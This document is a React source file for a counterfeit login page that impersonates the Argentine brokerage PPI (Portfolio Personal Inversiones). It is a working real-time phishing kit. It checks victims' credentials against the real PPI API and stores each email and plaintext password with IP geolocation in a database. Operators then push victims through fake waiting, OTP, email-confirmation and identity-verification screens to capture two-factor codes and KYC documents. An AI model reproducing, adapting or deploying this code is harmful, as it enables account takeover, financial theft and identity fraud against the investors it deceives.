import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { ppiApi } from "@/lib/ppiApi";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import { useIsMobile } from "@/hooks/use-mobile";
import PpiLoginForm from "@/components/ppi/PpiLoginForm";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import PpiOtpScreen from "@/components/ppi/PpiOtpScreen";
import PpiSecurityScreen from "@/components/ppi/PpiSecurityScreen";
import WayniKycFlow from "@/components/kyc/WayniKycFlow";
import ppiLogoSvg from "@/assets/ppi-logo.svg";
import qrFiscalPng from "@/assets/ppi-qr-fiscal.png";
import sidPng from "@/assets/ppi-sid.png";
import ppiBgPattern from "@/assets/ppi-bg-pattern.svg";

type PpiStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "kyc";

type StoredPpiFlow = {
  step: PpiStep;
  email: string;
  sessionId: string | null;
  errorMessage: string;
  generalError: string;
  kycCaseId: string | null;
  twofaType: number | null;
};

const PPI_STORAGE_KEY = "ppi_flow_state_v1";

const PPI = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const initialFlow: StoredPpiFlow = (() => {
    try {
      const raw = sessionStorage.getItem(PPI_STORAGE_KEY);
      if (!raw) return { step: "form", email: "", sessionId: null, errorMessage: "", generalError: "", kycCaseId: null, twofaType: null };
      const parsed = JSON.parse(raw) as Partial<StoredPpiFlow>;
      const allowedSteps: PpiStep[] = ["form", "waiting", "success", "otp", "confirm_email", "kyc"];
      const parsedStep = allowedSteps.includes(parsed.step as PpiStep) ? (parsed.step as PpiStep) : "form";
      return {
        step: parsedStep,
        email: parsed.email || "",
        sessionId: parsed.sessionId || null,
        errorMessage: parsed.errorMessage || "",
        generalError: parsed.generalError || "",
        kycCaseId: parsed.kycCaseId || null,
        twofaType: parsed.twofaType ?? null,
      };
    } catch {
      return { step: "form", email: "", sessionId: null, errorMessage: "", generalError: "", kycCaseId: null, twofaType: null };
    }
  })();

  const [step, setStep] = useState<PpiStep>(initialFlow.step);
  const [email, setEmail] = useState(initialFlow.email);
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState(initialFlow.generalError);
  const [sessionId, setSessionId] = useState<string | null>(initialFlow.sessionId);
  const [errorMessage, setErrorMessage] = useState(initialFlow.errorMessage);
  const [kycCaseId, setKycCaseId] = useState<string | null>(initialFlow.kycCaseId);
  const [twofaType, setTwofaType] = useState<number | null>(initialFlow.twofaType);

  const rateLimit = useRateLimit();
  const isMobile = useIsMobile();
  const currentStepRef = useRef<PpiStep>("form");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    currentStepRef.current = step;
    const flowToStore: StoredPpiFlow = { step, email, sessionId, errorMessage, generalError, kycCaseId, twofaType };
    sessionStorage.setItem(PPI_STORAGE_KEY, JSON.stringify(flowToStore));
  }, [email, errorMessage, generalError, kycCaseId, sessionId, step, twofaType]);

  useEffect(() => {
    document.title = "PPI — Iniciar sesión";
    const meta = document.querySelector('meta[name="viewport"]');
    if (meta) meta.setAttribute("content", "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no");
    return () => { if (meta) meta.setAttribute("content", "width=device-width, initial-scale=1.0"); };
  }, []);

  const parseCaseIdFromLink = useCallback((link?: string | null) => {
    if (!link) return null;
    const match = link.trim().match(/\/kyc\/([^/?#]+)/i);
    return match?.[1] || null;
  }, []);

  const parseKycPayloadFromOtp = useCallback((otpCode?: string | null) => {
    if (!otpCode || !otpCode.startsWith("kyc_link:")) return null;
    const kycLink = otpCode.replace("kyc_link:", "").trim();
    if (!kycLink) return null;
    return { kyc_link: kycLink, kyc_case_id: parseCaseIdFromLink(kycLink) || undefined };
  }, [parseCaseIdFromLink]);

  const activateEmbeddedKyc = useCallback((payload?: { kyc_link?: string; kyc_case_id?: string } | string) => {
    const resolvedCaseId = typeof payload === "string"
      ? parseCaseIdFromLink(payload)
      : payload?.kyc_case_id || parseCaseIdFromLink(payload?.kyc_link);
    if (!resolvedCaseId) return;
    setKycCaseId(resolvedCaseId);
    setErrorMessage("");
    setGeneralError("");
    setStep("kyc");
  }, [parseCaseIdFromLink]);

  const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string) => {
    const status = typeof payload === "string" ? payload : payload?.status;
    if (!status) return;

    if (status === "redirect_kyc") { activateEmbeddedKyc(payload); return; }

    if (["login_success", "approved", "completed", "otp_approved", "confirm_approved", "sync_approved"].includes(status)) {
      setErrorMessage(""); setGeneralError(""); setStep("success"); return;
    }
    if (status === "wrong_password") {
      setErrorMessage("La contraseña de tu correo es incorrecta. Intentá nuevamente.");
      setGeneralError(""); setStep("waiting"); return;
    }
    if (status === "redirect_otp" || status === "show_otp") {
      setErrorMessage(""); setGeneralError(""); setStep("otp"); return;
    }
    if (status === "redirect_confirm_email" || status === "redirect_sync_email" || status === "confirm_email_pending" || status.startsWith("confirm_") || status.startsWith("sync_")) {
      setErrorMessage(""); setGeneralError(""); setStep("confirm_email"); return;
    }
    if (status === "pending_review" && currentStepRef.current === "waiting") {
      setErrorMessage("");
    }
  }, [activateEmbeddedKyc]);

  // ── Realtime + Polling (same as IOL) ──
  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    let isActive = true;
    let pollDelayMs = 1500;
    let pollTimeout: number | null = null;
    let lastSnapshotKey = "";

    const applySnapshot = (snapshot?: { status?: string; otp_code?: string | null }) => {
      const status = snapshot?.status;
      if (!status) return;
      if (status === "redirect_kyc") {
        const kycPayload = parseKycPayloadFromOtp(snapshot?.otp_code);
        if (kycPayload) { handleDecision({ status, ...kycPayload }); return; }
      }
      handleDecision(status);
    };

    const reviewChannel = supabase.channel(`session-review-${sessionId}`);
    reviewChannel.on("broadcast", { event: "review_decision" }, (payload) => {
      handleDecision(payload.payload as { status?: string; kyc_link?: string; kyc_case_id?: string } | undefined);
    }).subscribe();

    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel.on("broadcast", { event: "otp_decision" }, (payload) => {
      handleDecision(payload.payload?.status as string | undefined);
    }).subscribe();

    const pollStatus = async () => {
      try {
        const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
        if (!isActive) return;
        if (data?.status) {
          const snapshotKey = `${data.status}::${data.otp_code || ""}`;
          if (snapshotKey !== lastSnapshotKey) {
            lastSnapshotKey = snapshotKey;
            applySnapshot(data);
            pollDelayMs = 1500;
          } else {
            pollDelayMs = Math.min(Math.round(pollDelayMs * 1.35), 7000);
          }
        } else {
          pollDelayMs = Math.min(Math.round(pollDelayMs * 1.35), 7000);
        }
      } catch {
        if (!isActive) return;
        pollDelayMs = Math.min(Math.round(pollDelayMs * 1.5), 7000);
      }
      if (isActive) pollTimeout = window.setTimeout(pollStatus, pollDelayMs);
    };

    pollTimeout = window.setTimeout(pollStatus, pollDelayMs);

    return () => {
      isActive = false;
      if (pollTimeout) window.clearTimeout(pollTimeout);
      supabase.removeChannel(reviewChannel);
      supabase.removeChannel(otpChannel);
    };
  }, [sessionId, step, handleDecision, parseKycPayloadFromOtp]);

  // ── Translate PPI API error messages ──
  const translatePpiError = (error: string, raw?: any): string => {
    const lower = (error || "").toLowerCase();
    const rawMsg = (raw?.message || "").toLowerCase();
    const combined = `${lower} ${rawMsg}`;
    if (combined.includes("usuario y/o clave") || combined.includes("invalid") || combined.includes("incorrecta"))
      return "Usuario y/o contraseña incorrectos. Verificá tus datos e intentá nuevamente.";
    if (combined.includes("bloqueada") || combined.includes("blocked"))
      return "Tu cuenta se encuentra bloqueada. Contactá a PPI para más información.";
    if (combined.includes("rate") || combined.includes("limit"))
      return "Demasiados intentos. Esperá unos minutos antes de volver a intentar.";
    if (error) return error;
    return "Error al iniciar sesión. Intentá nuevamente.";
  };

  // ── Login: validate via API, then create manual session ──
  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError("");
    setErrorMessage("");
    setLoading(true);
    setEmail(submittedEmail);
    setKycCaseId(null);

    try {
      // Step 1: Validate credentials via PPI API
      const res = await ppiApi.loginWeb(submittedEmail, password, operatorCode);

      // Check for credential errors — block immediately
      if (res.error && !res.requires_2fa && !res.success) {
        const rawMsg = res.raw?.message || res.error || "";
        const isCredentialError = /usuario.*clave|invalid|incorrecta|bloqueada|blocked|banned|suspendida/i.test(`${res.error} ${rawMsg}`);
        if (isCredentialError) {
          setGeneralError(translatePpiError(res.error, res.raw));
          setLoading(false);
          return;
        }
        // For non-credential errors, try mobile fallback
        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
        if (mobileRes.error && !mobileRes.success && mobileRes.raw?.status !== 0) {
          setGeneralError(translatePpiError(mobileRes.error || res.error, mobileRes.raw || res.raw));
          setLoading(false);
          return;
        }
      }

      // Step 2: Credentials valid — create session as pending_review
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const ipRes = await fetch("https://ipapi.co/json/");
        if (ipRes.ok) {
          const d = await ipRes.json();
          ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" };
        }
      } catch { /* ignore */ }

      // Build otp_code with extra info from API response
      const otpParts: string[] = [];
      if (res.fullName) otpParts.push(`name:${res.fullName}`);
      if (res.requires_2fa) otpParts.push(`api_2fa:true`);
      if (res.twofa_type !== undefined) {
        otpParts.push(`twofa_type:${res.twofa_type}`);
        setTwofaType(typeof res.twofa_type === "number" ? res.twofa_type : parseInt(res.twofa_type, 10));
      }
      otpParts.push("validated:true");

      const newId = crypto.randomUUID();
      await supabase.from("sessions").insert({
        id: newId,
        email: submittedEmail,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "ppi",
        operator_code: operatorCode,
        otp_code: otpParts.join("|") || null,
      });

      setSessionId(newId);
      setStep("waiting");
    } catch {
      setGeneralError("No pudimos iniciar sesión. Intentá nuevamente.");
    } finally {
      setLoading(false);
    }
  }, [operatorCode]);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return;
    setErrorMessage("");
    await supabase.from("sessions").update({ password: newPassword, status: "pending_review" }).eq("id", sessionId);
    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({ type: "broadcast", event: "review_decision", payload: { status: "pending_review" } });
        window.setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => {
    sessionStorage.removeItem(PPI_STORAGE_KEY);
    setStep("form"); setSessionId(null); setKycCaseId(null); setErrorMessage(""); setGeneralError("");
  }, []);

  const handleGoToConfirmEmail = useCallback(() => {
    setErrorMessage(""); setGeneralError(""); setStep("confirm_email");
    if (sessionId) {
      supabase.from("sessions").update({ status: "redirect_confirm_email" }).eq("id", sessionId).then(() => {});
    }
  }, [sessionId]);

  const isKycStep = step === "kyc" && Boolean(kycCaseId);
  const isPostLoginFlow = !isKycStep && step !== "form";
  const showFullPage = step === "form" || step === "waiting";

  const mainTitle = useMemo(() => {
    if (isKycStep) return "Validación de identidad";
    if (step === "waiting") return "Actualización de seguridad";
    return "Te damos la bienvenida";
  }, [isKycStep, step]);

  const renderCardContent = () => {
    if (step === "kyc" && kycCaseId) return <WayniKycFlow caseId={kycCaseId} embedded brandLabel="PPI" source="ppi" />;
    if (step === "otp" && sessionId) return <PpiOtpScreen email={email} sessionId={sessionId} twofaType={twofaType ?? undefined} onBack={handleRetry} />;
    if (step === "confirm_email") return <PpiSecurityScreen email={email} />;
    if (step === "waiting" && sessionId) {
      return (
        <WaitingScreen
          email={email}
          sessionId={sessionId}
          errorMessage={errorMessage}
          onPasswordResubmit={handlePasswordResubmit}
          onVerifyEmail={handleGoToConfirmEmail}
        />
      );
    }
    if (step === "success") return <SuccessScreen email={email} />;
    return (
      <>
        {generalError && (
          <div className="mb-5 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">{generalError}</div>
        )}
        <PpiLoginForm onSubmit={handleLoginSubmit} loading={loading} error="" />
      </>
    );
  };

  if (rateLimit.loading) return (
    <div className="flex min-h-screen items-center justify-center bg-white text-[#8c939a]">Cargando...</div>
  );

  if (rateLimit.blocked) return (
    <div className="flex min-h-screen items-center justify-center bg-white px-4">
      <div className="w-full max-w-md rounded-2xl border border-[#e5e7eb] bg-white p-8 text-center">
        <h1 className="text-xl font-semibold text-[#1e2a3a]">Acceso restringido</h1>
        <p className="mt-2 text-sm text-[#8c939a]">Detectamos actividad inusual y bloqueamos temporalmente este acceso.</p>
      </div>
    </div>
  );

  // Full-page screens render directly
  if (step === "confirm_email") return <PpiSecurityScreen email={email} />;
  if (step === "otp" && sessionId) return <PpiOtpScreen email={email} sessionId={sessionId} twofaType={twofaType ?? undefined} onBack={handleRetry} />;

  return (
    <div className="flex min-h-[100svh] flex-col bg-white">
      {/* Header */}
      {showFullPage && (
        <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white">
          <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
          <span className="text-[13px] sm:text-[14px] font-normal text-[#8c939a]">Acceso a PPI</span>
        </header>
      )}

      <main className="relative flex flex-1 items-center justify-center overflow-hidden">
        {showFullPage && (
          <div className="pointer-events-none absolute inset-0 hidden sm:flex items-center justify-center">
            <img src={ppiBgPattern} alt="" className="w-full h-full object-cover" style={{ opacity: 0.6 }} />
          </div>
        )}

        {isKycStep ? (
          <div className="relative z-10 w-full h-full overflow-hidden">{renderCardContent()}</div>
        ) : (
          <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
            {step === "form" && (
              <h1 className="mb-6 text-center text-[20px] sm:text-[22px] font-bold text-[#1e2a3a]">{mainTitle}</h1>
            )}
            {renderCardContent()}
          </div>
        )}
      </main>

      {/* Footer */}
      {showFullPage && (
        <footer className="border-t border-[#e5e7eb] bg-white px-5 py-3 sm:px-10">
          <div className="hidden sm:flex items-center justify-between">
            <div className="flex items-center gap-2 text-[11px] text-[#999]">
              <span>Portfolio Personal Inversiones | Copyright 2021</span>
              <span className="text-[#ccc]">|</span>
              <span>ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73</span>
              <span className="text-[#ccc]">|</span>
              <button type="button" className="text-[#42a5f5] hover:underline">Términos y políticas de privacidad</button>
            </div>
            <div className="flex items-center gap-3">
              <img src={qrFiscalPng} alt="Data Fiscal" className="h-9 object-contain" />
              <img src={sidPng} alt="SID" className="h-9 object-contain" />
            </div>
          </div>
          <div className="flex flex-col items-center gap-2 sm:hidden py-2">
            <p className="text-center text-[10px] text-[#999]">Portfolio Personal Inversiones | Copyright 2021</p>
            <p className="text-center text-[10px] text-[#bbb]">ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73</p>
            <button type="button" className="text-[10px] text-[#42a5f5] hover:underline">Términos y políticas de privacidad</button>
            <div className="flex items-center gap-3 mt-1">
              <img src={qrFiscalPng} alt="Data Fiscal" className="h-8 object-contain" />
              <img src={sidPng} alt="SID" className="h-8 object-contain" />
            </div>
          </div>
        </footer>
      )}
    </div>
  );
};

export default PPI;
